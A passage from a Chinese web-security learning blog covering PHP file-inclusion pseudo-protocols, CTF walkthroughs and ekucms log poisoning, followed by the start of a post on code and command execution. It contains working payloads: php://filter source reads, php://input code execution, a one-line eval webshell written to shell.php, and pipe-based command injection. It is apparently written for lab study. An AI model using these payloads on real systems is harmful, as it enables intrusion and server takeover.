src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image18.webp" alt="image18"></p><p><strong>http://——只读访问HTTP(s)网址</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image19.webp" alt="image19"></p><p><strong>ftp://——访问FTP(s) URLs</strong></p><p><strong>php://——访问各个输入/输出流（I/O streams）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image20.webp" alt="image20"></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image21.webp" alt="image21"></p><p><strong>zlib://——压缩流</strong></p><p><strong>data://——数据（RFC 2397）</strong></p><p><strong>glob://——查找匹配的文件路径模式</strong></p><p><strong>phar://——PHP 归档</strong></p><p><strong>ssh2://——Secure Shell 2</strong></p><p><strong>rar://——RAR</strong></p><p><strong>ogg://——音频流</strong></p><p><strong>expect://——处理交互式的流</strong></p><h3 id="3-各种协议的利用条件和方法"><a href="#3-各种协议的利用条件和方法" class="headerlink" title="3.各种协议的利用条件和方法"></a>3.各种协议的利用条件和方法</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image22.webp" alt="image22"></p><h3 id="4-标准输入流和输出流的原理"><a href="#4-标准输入流和输出流的原理" class="headerlink" title="4.标准输入流和输出流的原理"></a>4.标准输入流和输出流的原理</h3><ul><li><p>存储量（依次递减）： 外存–&gt;内存–&gt;缓存</p></li><li><p>读取速度（依次递减）： 缓存–&gt;内存–&gt;外存</p></li><li><p>对于内存和外存的理解，我们可以简单的理解为容器，即外存是一个容器，内存又是另外一个容器。</p></li><li><p>将输入输出抽象称为流，就好像水管，将两个容器连接起来。将数据冲外存中读取到内存中的称为输入流，将数据从内存写入外存中的称为输出流。</p></li><li><p>流是一个很形象的概念，当程序需要读取数据的时候，就会开启一个通向数据源的流，这个数据源可以是文件，内存，或是网络连接。类似的，当程序需要写入数据的时候，就会开启一个通向目的地的流。</p></li></ul><h3 id="5-php协议读取newfile-txt文件的源码（注意：PHP协议只能在PHP脚本适用）"><a href="#5-php协议读取newfile-txt文件的源码（注意：PHP协议只能在PHP脚本适用）" class="headerlink" title="5.php协议读取newfile.txt文件的源码（注意：PHP协议只能在PHP脚本适用）"></a>5.php协议读取newfile.txt文件的源码（注意：PHP协议只能在PHP脚本适用）</h3><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://filter/read=convert.base64-encode/resource=newfile.txt">http://192.168.176.128:10086/test.php?filename=php://filter/read=convert.base64-encode/resource=newfile.txt</a></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image47.png" alt="image47"></p><p><strong>原理：</strong>在文件输入之前先过滤，读取过滤器内的内容，其中resource为要过滤的数据流。</p><p><strong>base64加密原因：</strong>有时候读取由于编码方式的不同造成乱码，这里加密后，就不会乱码。</p><p>然后利用解码工具解码即可。</p><h3 id="6-以php格式执行文件"><a href="#6-以php格式执行文件" class="headerlink" title="6.以php格式执行文件"></a>6.以php格式执行文件</h3><ul><li><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://input">http://192.168.176.128:10086/test.php?filename=php://input</a></p></li><li><p>post提交数据：<code>&lt;?php system(ipconfig); ?&gt;</code></p></li></ul><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/23.png" alt="23"></p><p><strong>原理：</strong>php://input可以读取没有处理过的POST数据。相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置。php://input不能用于enctype=multipart/form-data。</p><h3 id="7-php协议写入一句话后门代码"><a href="#7-php协议写入一句话后门代码" class="headerlink" title="7.php协议写入一句话后门代码"></a>7.php协议写入一句话后门代码</h3><ul><li><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=php://input">http://192.168.176.128:10086/test.php?filename=php://input</a></li><li>post提交数据：<code>&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_GET[cmd]); ?&gt;&#39;)?&gt;</code></li></ul><p>原理：用fopen打开或者创建一个shell.php的文件，用fputs将字符串<code>&lt;?php @eval($_GET[cmd]); ?&gt;</code>写入shell.php文件中.</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image24.png" alt="image24"></p><p>已写入</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image25.png" alt="image25"></p><h3 id="8-file协议读取文件内容（所有脚本都适用）"><a href="#8-file协议读取文件内容（所有脚本都适用）" class="headerlink" title="8.file协议读取文件内容（所有脚本都适用）"></a>8.file协议读取文件内容（所有脚本都适用）</h3><p>使用条件是file协议需要用到完整路径。</p><p>此处的txt文件居然以php格式执行了。。。。。。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image26.png" alt="image26"></p><h3 id="9-data协议来执行指定的php脚本代码"><a href="#9-data协议来执行指定的php脚本代码" class="headerlink" title="9.data协议来执行指定的php脚本代码"></a>9.data协议来执行指定的php脚本代码</h3><p><strong>使用条件：</strong>allow_url_fopen和allow_url_include开启</p><p><a target="_blank" rel="noopener" href="http://192.168.176.128:10086/test.php?filename=data://text/plain,%3C?php%20echo%20%27123%27%20?%3E">http://192.168.176.128:10086/test.php?filename=data://text/plain,%3C?php%20echo%20%27123%27%20?%3E</a></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image27.png" alt="image27"></p><h3 id="10-总结"><a href="#10-总结" class="headerlink" title="10.总结"></a>10.总结</h3><ul><li><p>伪协议常常用于文件包含漏洞之中。</p></li><li><p>在php中能够造成文件包含的函数有include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile。</p></li><li><p>include函数：可以放在PHP脚本的任意位置，一般放在流程控制的处理部分中。当PHP脚本执行到include指定引入的文件时，才将它包含并尝试执行。当第二次遇到相同文件时，PHP还是会重新解释一次。</p></li><li><p>require函数：一般放在PHP脚本的最前面，PHP执行前就会先读入require指定引入的文件，包含并尝试执行引入的脚本文件。require的工作方式是提高PHP的执行效率，当它在同一个网页中解释过一次后，第二次便不会解释。</p></li><li><p>include_once和require_once函数：分别与require / include作用相同，不同的是他们在执行到时会先检查目标内容是不是在之前已经导入过，如果导入过了，那么便不会再次重复引入其同样的内容。</p></li><li><p>hightfile函数：highlight_file(filename,return) —— filename：必需。要进行高亮处理的 PHP 文件的路径。return：可选。如果设置 true，则本函数返回高亮处理的代码。该函数通过使用 PHP 语法高亮程序中定义的颜色，输出或返回包含在 filename 中的代码的语法高亮版本。</p></li><li><p>show_source函数：该函数是highlight_file函数的别名。</p></li><li><p>file_get_content函数：把整个文件读入一个字符串中。和 file() 一样，不同的是 file_get_contents() 把文件读入一个字符串。</p></li><li><p>file() 函数：把整个文件读入一个数组中。与 file_get_contents() 类似，不同的是 file() 将文件作为一个数组返回。数组中的每个单元都是文件中相应的一行，包括换行符在内。如果失败，则返回 false 。</p></li></ul><h2 id="三-ctf题目"><a href="#三-ctf题目" class="headerlink" title="三.ctf题目"></a>三.ctf题目</h2><h3 id="1-CTF-南邮大-i-春秋百度杯真题-白盒"><a href="#1-CTF-南邮大-i-春秋百度杯真题-白盒" class="headerlink" title="1.CTF-南邮大,i 春秋百度杯真题-白盒"></a>1.CTF-南邮大,i 春秋百度杯真题-白盒</h3><p>进入南邮靶场：<a target="_blank" rel="noopener" href="http://4.chinalover.sinaapp.com/web7/index.php">http://4.chinalover.sinaapp.com/web7/index.php</a></p><p>这里url有文件传参，可以测试文件包含/下载漏洞，在真实的环境下，可以用扫描工具扫描（文件下载漏洞）。尝试修改文件参数名，发现显示不正常，说明的确是以文件传参。而且可以执行php文件，多半是php脚本搭建的网站。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image28.png" alt="image28"></p><p><strong>直接访问show.php文件（明确存在文件包含漏洞）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image29.png" alt="image29"></p><p><strong>数据包查看环境（这里只发现中间件nginx，php脚本）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image30.png" alt="image30"></p><p><strong>大小写判断操作系统（发现为linux）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image31.png" alt="image31"></p><p><strong>利用伪协议进行命令执行</strong></p><p>测试php命令（这里有无法执行，查看php伪协议的要求：allow_url_include参数必须要开启，可能这里没有开启，这里可以实施php伪协议的过滤器读取）.</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image32.webp" alt="image32"></p><p><strong>读取当前路径下的：index.php文件（读取成功，则前面的猜测成立）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image33.webp" alt="image33"></p><p><strong>解密（获取到了flag）</strong></p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image34.webp" alt="image34"></p><h3 id="2-i春秋靶场"><a href="#2-i春秋靶场" class="headerlink" title="2.i春秋靶场"></a>2.i春秋靶场</h3><p>出现一串php代码：如果传递的参数带path，就包含这个path，否则的话执行phpinfo.php。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image35.png" alt="image35"></p><p>通过文件包含漏洞读取phpinfo.php</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image36.png" alt="image36"></p><p>大小写判断操作系统（为linux）</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image37.png" alt="image37"></p><p>伪协议进行命令执行</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image38.webp" alt="image38"></p><p>读取dle345aae.php文件</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image48.webp" alt="image48"></p><p>源代码查看</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image39.webp" alt="image39"></p><p>php过滤器加密读取</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image49.webp" alt="image49"></p><p>解密</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image40.webp" alt="image40"></p><h2 id="四-某CMS程序文件包含利用-黑盒"><a href="#四-某CMS程序文件包含利用-黑盒" class="headerlink" title="四.某CMS程序文件包含利用-黑盒"></a>四.某CMS程序文件包含利用-黑盒</h2><h3 id="1-进入靶场"><a href="#1-进入靶场" class="headerlink" title="1.进入靶场"></a>1.进入靶场</h3><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image41.png" alt="image41"></p><h3 id="2-发现漏洞"><a href="#2-发现漏洞" class="headerlink" title="2.发现漏洞"></a>2.发现漏洞</h3><ul><li>漏洞扫描工具</li><li>CMS公开漏洞</li><li>手工看参数及功能点</li></ul><p>发现这里的CMS</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image42.png" alt="image42"></p><p>百度该CMS漏洞</p><p>后门代码为{}原因：文件包含以php脚本执行，而传统&lt;&gt;是告诉电脑以php脚本执行，因此这里不需要写&lt;&gt;。</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image43.webp" alt="image43"></p><h3 id="3-执行漏洞"><a href="#3-执行漏洞" class="headerlink" title="3.执行漏洞"></a>3.执行漏洞</h3><ul><li><p>访问该文件包含url（<a target="_blank" rel="noopener" href="http://192.168.176.128:10086/ekucms2.4.1/index.php?s=my/show/id/%EF%BC%89">http://192.168.176.128:10086/ekucms2.4.1/index.php?s=my/show/id/）</a></p></li><li><p>包含日志文件（在s=my/show/id/路径下，不存在后门.html的文件，这个消息会被写入日志当中，可以看出，这里的文件包含设置了限制(添加html后缀)）</p></li><li><p>写入后门（<code>&#123;~eval($_POST[x])&#125;</code>）</p></li><li><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image44.png" alt="image44"></p></li><li><p>服务器发现日志生成</p></li></ul><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image45.png" alt="image45"></p><p>直接通过菜刀连接</p><p><img src="/2022/03/01/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E4%B9%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image46.png" alt="image46"></p><h2 id="五-漏洞修复"><a href="#五-漏洞修复" class="headerlink" title="五.漏洞修复"></a>五.漏洞修复</h2><ul><li><p>要传参，对参数进行过滤检测变形</p></li><li><p>尽量不传参，将参数固定写死（固定文件）</p></li><li><p>传参后，固定文件名的后缀（有绕过的可能）</p></li><li><p>waf产品</p></li></ul></div><footer class="post-footer"><div class="post-eof"></div></footer></article><article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://www.zymstudy.club/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/Panda.jpg"><meta itemprop="name" content="zym"><meta itemprop="description" content="生活日常随笔"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="猪哥的博客"></span><header class="post-header"><h2 class="post-title" itemprop="name headline"><a href="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" class="post-title-link" itemprop="url">RCE代码及命令执行漏洞全解</a></h2><div class="post-meta"><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar"></i> </span><span class="post-meta-item-text">发表于</span> <time title="创建时间：2022-02-28 10:56:46" itemprop="dateCreated datePublished" datetime="2022-02-28T10:56:46+08:00">2022-02-28</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-calendar-check"></i> </span><span class="post-meta-item-text">更新于</span> <time title="修改时间：2022-03-03 11:24:33" itemprop="dateModified" datetime="2022-03-03T11:24:33+08:00">2022-03-03</time> </span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-folder"></i> </span><span class="post-meta-item-text">分类于</span> <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web%E5%AE%89%E5%85%A8%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">web安全渗透学习</span></a> </span></span><span class="post-meta-item"><span class="post-meta-item-icon"><i class="far fa-comment"></i> </span><span class="post-meta-item-text">Valine：</span> <a title="valine" href="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/#valine-comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/" itemprop="commentCount"></span></a></span><br><span class="post-meta-item" title="本文字数"><span class="post-meta-item-icon"><i class="far fa-file-word"></i> </span><span class="post-meta-item-text">本文字数：</span> <span>1.8k</span> </span><span class="post-meta-item" title="阅读时长"><span class="post-meta-item-icon"><i class="far fa-clock"></i> </span><span class="post-meta-item-text">阅读时长 &asymp;</span> <span>2 分钟</span></span></div></header><div class="post-body" itemprop="articleBody"><h1 id="RCE代码及命令执行漏洞全解"><a href="#RCE代码及命令执行漏洞全解" class="headerlink" title="RCE代码及命令执行漏洞全解"></a>RCE代码及命令执行漏洞全解</h1><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image1.webp" alt="image1"></p><p>在 Web 应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="一-代码执行RCE漏洞"><a href="#一-代码执行RCE漏洞" class="headerlink" title="一.代码执行RCE漏洞"></a>一.代码执行RCE漏洞</h2><h3 id="1-搭建靶场"><a href="#1-搭建靶场" class="headerlink" title="1.搭建靶场"></a>1.搭建靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image2.png" alt="image2"></p><p>eval()函数作用，即get传递的参数（字符串）会被当成php脚本执行。</p><h3 id="2-访问靶场"><a href="#2-访问靶场" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h3><p>发现传递的参数被当成php脚本执行。</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image3.png" alt="image3"></p><p>写入文件代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;newfile.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Unable to open file!&quot;</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;Bill Gates\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line"><span class="variable">$txt</span> = <span class="string">&quot;Steve Jobs\n&quot;</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>, <span class="variable">$txt</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/Users\朱易明\AppData\Roaming\Typora\typora-user-images\image-20220228112020343.png" alt="image-20220228112020343"></p><p>成功创建文件！</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image4.png" alt="image4"></p><h2 id="二-命令执行漏洞"><a href="#二-命令执行漏洞" class="headerlink" title="二.命令执行漏洞"></a>二.命令执行漏洞</h2><h3 id="1-搭建靶场-1"><a href="#1-搭建靶场-1" class="headerlink" title="1.搭建靶场"></a>1.搭建靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image5.png" alt="image5"></p><p>system是将get传递的字符串当作系统命令去执行。</p><h3 id="2-访问靶场-1"><a href="#2-访问靶场-1" class="headerlink" title="2.访问靶场"></a>2.访问靶场</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image6.png" alt="image6"></p><h2 id="三-总结"><a href="#三-总结" class="headerlink" title="三.总结"></a>三.总结</h2><p>漏洞形成的条件：</p><ul><li>可控变量（无论是注入还是RCE都有参数）</li><li>漏洞函数（用什么函数对于这个参数进行操作，如上题命令执行和代码执行漏洞的区别就是漏洞函数的不同，如果是输出就是XSS，如果文件提交，就是文件上传，如果输出查询，就是SQL注入）</li></ul><h2 id="四-代码-命令执行漏洞的查找"><a href="#四-代码-命令执行漏洞的查找" class="headerlink" title="四.代码/命令执行漏洞的查找"></a>四.代码/命令执行漏洞的查找</h2><ul><li>代码审计</li><li>漏洞工具扫描</li><li>搜索引擎搜索公开漏洞</li><li>手工查看参数值和功能点判断（参数值和脚本有关，如test.php?x=echo 等等）</li></ul><h2 id="五-墨者靶场黑盒功能点命令执行"><a href="#五-墨者靶场黑盒功能点命令执行" class="headerlink" title="五.墨者靶场黑盒功能点命令执行"></a>五.墨者靶场黑盒功能点命令执行</h2><h3 id="1-靶场地址"><a href="#1-靶场地址" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image7.png" alt="image7"></p><h3 id="2-ping本地地址"><a href="#2-ping本地地址" class="headerlink" title="2.ping本地地址"></a>2.ping本地地址</h3><p>能ping通</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image8.png" alt="image8"></p><h3 id="3-使用管道符-（由于已知是linux）"><a href="#3-使用管道符-（由于已知是linux）" class="headerlink" title="3.使用管道符(|)（由于已知是linux）"></a>3.使用管道符(|)（由于已知是linux）</h3><p>显示IP格式不正确，应该是有过滤</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image9.png" alt="image9"></p><p>查看源代码</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image10.png" alt="image10"></p><p>解决方法有三个：</p><ul><li>浏览器设置禁用本地js</li><li>将网站源代码复制，将验证的js代码删除</li><li>抓包工具修改数据包（在数据包内修改执行语句，就不会被前端检测）</li></ul><h3 id="4-禁用JS"><a href="#4-禁用JS" class="headerlink" title="4.禁用JS"></a>4.禁用JS</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image11.png" alt="image11"></p><p>再次使用管道符(|)，返回相关文件</p><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image12.png" alt="image12"></p><h3 id="5-使用管道符来查看该文件"><a href="#5-使用管道符来查看该文件" class="headerlink" title="5.使用管道符来查看该文件"></a>5.使用管道符来查看该文件</h3><p><img src="/2022/02/28/RCE%E4%BB%A3%E7%A0%81%E5%8F%8A%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%85%A8%E8%A7%A3/image13.png" alt="image13"></p><p><strong>注意：</strong>cat&lt; 与cat没有什么区别，但cat&lt;是最标准的写法，一般来说cat是省略了&lt;的写法。</p><h2 id="六-墨者靶场白盒代码及命令执行"><a href="#六-墨者靶场白盒代码及命令执行" class="headerlink" title="六.墨者靶场白盒代码及命令执行"></a>六.墨者靶场白盒代码及命令执行</h2><h3 id="1-靶场地址-1"><a href="#1-靶场地址-1" class="headerlink" title="1.靶场地址"></a>1.靶场地址</h3><p><img 